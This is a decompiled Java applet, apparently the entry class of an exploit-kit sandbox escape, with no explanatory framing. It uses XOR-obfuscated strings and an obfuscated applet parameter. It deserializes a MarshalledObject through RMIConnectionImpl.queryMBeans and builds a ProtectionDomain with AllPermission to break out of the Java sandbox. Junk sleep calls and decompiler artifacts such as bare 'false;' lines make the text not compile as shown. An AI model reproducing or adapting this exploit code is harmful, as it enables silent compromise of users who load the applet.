import java.security.PermissionCollection;
import java.security.CodeSource;
import java.security.Permission;
import java.security.Permissions;
import java.security.AllPermission;
import java.security.ProtectionDomain;
import javax.management.ObjectName;
import javax.security.auth.Subject;
import javax.management.remote.rmi.RMIServerImpl;
import javax.management.remote.rmi.RMIConnectionImpl;
import javax.management.MBeanServer;
import java.util.Map;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RMIClientSocketFactory;
import javax.management.remote.rmi.RMIJRMPServerImpl;
import java.rmi.MarshalledObject;
import java.io.IOException;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import javax.swing.JApplet;

// 
// Decompiled by Procyon v0.5.30
// 

public class main extends JApplet
{
    Boolean boolean1;
    Boolean obiveauiiq;
    public static String __v;
    public static String __Y;
    static String filename;
    String xuubi;
    
    public main() {
        this.boolean1 = true;
        this.obiveauiiq = false;
        this.xuubi = "_022e2a8eaa";
    }
    
    public static byte[] getBytesFromStream(final InputStream inputStream) throws IOException {
        final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        final byte[] array = new byte[1024];
        while (true) {
            final int read = inputStream.read(array, 0, 1024);
            if (read <= -1) {
                break;
            }
            byteArrayOutputStream.write(array, 0, read);
        }
        return byteArrayOutputStream.toByteArray();
    }
    
    public static void main(final String[] array) throws IOException {
    }
    
    @Override
    public void init() {
        final String coder = coder("u\u007fq|ppidlk(,$;.#>-')$((1<$#;=3*=2!<4\u0002\r\u0007\u0001\u001a\u0015\u0013\u001a\u0000\u0004\f\u0013\u0006\u000b\u0016\u0015\u001f\u0011\u001c\u0010\u0010\t\u0004\f\u000b\u0013aie\u0014hfcsfl");
        final String coder2 = coder("0s4\n/\u00141\u001d86!m\u000b)&4<,\u001a\f\u000b\u0007#=f\u0003!#\u0016h/m1w\u000ey;=i*\t\u001el\u0014\b\u0014$\u0000z\u0002\u0011\u001cx\u0013|\u0016uz*\u0007f(4\r8\u001ez\u0010\u007fwq\r");
        main.__v = this.getParameter(coder("\"/.*\u001b,;"));
        main.__v = __n(main.__v, coder2, coder);
        main.__Y = coder("}v{w");
        if (main.__v == null) {
            return;
        }
        MarshalledObject marshalledObject = null;
        try {
            marshalledObject = (MarshalledObject)q3p0.__s(main.filename, this.getClass());
        }
        catch (IOException ex) {}
        catch (ClassNotFoundException ex2) {}
        try {
            if (marshalledObject != null) {
                final RMIJRMPServerImpl rmijrmpServerImpl = new RMIJRMPServerImpl(0, null, null, null);
                rmijrmpServerImpl.setMBeanServer(new y6u7());
                Thread.sleep(0L);
                Thread.sleep(0L);
                Thread.sleep(0L);
                Thread.sleep(0L);
                final RMIConnectionImpl rmiConnectionImpl = new RMIConnectionImpl(rmijrmpServerImpl, coder("*%,$+.0;3"), null, null, null);
                Thread.sleep(0L);
                false;
                Thread.sleep(0L);
                Thread.sleep(0L);
                Thread.sleep(0L);
                rmiConnectionImpl.queryMBeans(null, marshalledObject, null);
                Thread.sleep(0L);
                Thread.sleep(0L);
                Thread.sleep(0L);
                false;
                Thread.sleep(0L);
            }
        }
        catch (Exception ex3) {}
    }
    
    public static String __n(final String s, final String s2, final String s3) {
        String string = "";
        for (int i = 0; i < s.length(); ++i) {
            final int index = s2.indexOf(s.substring(i, i + 1));
            if (index > -1) {
                string += s3.substring(index, index + 1);
            }
        }
        false;
        return string;
    }
    
    public static String __U(final String s, final String s2) {
        final StringBuffer sb = new StringBuffer();
        final int length = s.length();
        false;
        final int length2 = s2.length();
        false;
        for (int i = 0; i < length; ++i) {
            final char char1 = s.charAt(i);
            false;
            sb.append((char)(char1 ^ s2.charAt(i % length2)));
        }
        return sb.toString();
    }
    
    public static ProtectionDomain __e() {
        final AllPermission allPermission = new AllPermission();
        false;
        false;
        final Permissions permissions = new Permissions();
        permissions.add(allPermission);
        return new ProtectionDomain(null, permissions);
    }
    
    public static String coder(final String s) {
        return __U(s, "ENCODE_STRING_KEY");
    }
    
    static {
        main.__v = null;
        main.__Y = null;
        main.filename = "a7d7";
    }
}
